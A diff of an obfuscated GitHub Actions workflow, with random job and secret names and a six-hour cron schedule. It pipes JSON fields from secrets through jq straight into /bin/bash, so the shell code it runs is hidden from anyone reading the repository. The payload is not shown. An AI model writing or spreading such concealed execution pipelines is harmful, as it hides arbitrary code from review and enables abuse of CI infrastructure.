@@ -3,8 +3,9 @@ name: yaoqingshu5467
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
-jobs:  # 29082
+    - cron: '4 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +13,16 @@ jobs:  # 29082
       - uses: actions/checkout@v4
       - name: yaoqingshu5467
         env:
-          ywwww4697: ${{ secrets.ywwww4697 }}
+          bq45587: ${{ secrets.bq45587 }}
         run: |
-          echo $ywwww4697 | jq -r .jf9851 | /bin/bash
-          echo $x661 | jq -r .dr43 | /bin/bash
-          echo $rib847 | jq -r .i40 | /bin/bash
-          echo $cjy07799 | jq -r .djoj5680 | /bin/bash
-          echo $tbgpa222 | jq -r .iks06 | /bin/bash
-          echo $gwxsq09 | jq -r .manl45 | /bin/bash
-          echo $m2959 | jq -r .sfnyr201 | /bin/bash
+          echo $bq45587 | jq -r .k1447 | /bin/bash
+          echo $a96099 | jq -r .go8642 | /bin/bash
+          echo $ykod27 | jq -r .euf878 | /bin/bash
+          echo $udj84189 | jq -r .iaz09 | /bin/bash
+          echo $sqecj1 | jq -r .hway857 | /bin/bash
+          echo $aye6312 | jq -r .rzgyq1 | /bin/bash
+          echo $afm09 | jq -r .zxmbo85276 | /bin/bash
+          echo $dmcfg7740 | jq -r .nga275 | /bin/bash
+          echo $o8 | jq -r .k12098 | /bin/bash
+          echo $ce7651 | jq -r .bhvru856 | /bin/bash
 
